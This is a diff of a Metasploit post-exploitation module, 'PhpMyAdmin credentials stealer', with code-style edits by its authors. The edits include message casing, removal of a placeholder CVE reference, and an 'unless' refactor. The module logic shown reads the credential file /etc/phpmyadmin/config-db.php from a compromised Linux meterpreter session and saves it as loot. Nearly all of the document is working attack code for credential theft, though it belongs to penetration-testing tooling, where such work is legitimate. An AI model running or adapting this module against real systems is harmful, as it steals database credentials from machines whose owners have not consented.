@@ -11,21 +11,15 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
-      'Name'         => "PhpMyAdmin credentials stealer",
+      'Name'         => "Phpmyadmin credentials stealer",
       'Description'  => %q{
-        This module gathers PhpMyAdmin Creds from Target Linux machine.
+        This module gathers Phpmyadmin creds from target linux machine.
       },
       'License'      => MSF_LICENSE,
       'Platform'     => ['linux'],
       'SessionTypes' => ['meterpreter'],
       'Arch'         => 'x86_x64',
-      'Privileged'   => 'true',
-      'References'   =>
-        [
-          [ 'CVE', '0000-0000' ] # This module does not require any CVE this was added to pass msftidy.
-
-        ],
-      'Author'               => [
+      'Author'       => [
         'Chaitanya Haritash [bofheaded]',
         'Dhiraj Mishra <dhiraj@notsosecure.com>'
         ]
@@ -39,17 +33,16 @@ class MetasploitModule < Msf::Post
 
   def run
 
-    sess = client
     print_line("\nPhpMyAdmin Creds Stealer!\n")
     cred_dump = ""
 
     if session.platform.include?("windows")
-      print_error("This Module is not Compatible with Windows")
+      print_error("This module is not compatible with windows")
       return
     end
 
     conf_path= "/etc/phpmyadmin/config-db.php"
-    if file_exist?(conf_path) == false
+    unless file_exist?(conf_path)
       print_error("#{conf_path} doesn't exist on target")
       return
     end
@@ -59,9 +52,7 @@ class MetasploitModule < Msf::Post
     res = read_file(conf_path)
 
     cred_dump << res
-    store_loot("phpmyadmin_conf","text/plain",sess,cred_dump,"phpmyadmin_conf.txt","phpmyadmin_conf")
-    print_good("Storing dump in ~/.msf4/loot/")
-    print_status("Extracted Creds ::\n")
-    print_line(res)
+    p = store_loot('phpmyadmin_conf', 'text/plain', session, cred_dump, 'phpmyadmin_conf.txt', 'phpmyadmin_conf')
+    print_good("Credentials saved in #{p}")
   end
 end
